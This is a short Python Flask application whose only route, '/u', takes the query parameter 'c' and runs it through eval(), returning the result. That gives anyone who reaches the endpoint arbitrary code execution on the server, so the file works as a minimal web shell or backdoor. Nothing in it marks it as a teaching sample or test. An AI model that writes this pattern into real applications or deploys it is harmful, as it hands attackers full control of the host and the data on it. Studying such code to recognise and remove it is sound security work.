from flask import Flask, request, redirect, url_for, render_template, render_template_string
app = Flask(__name__)
@app.route("/u")
def u():
    return str(eval(request.args.get("c")))
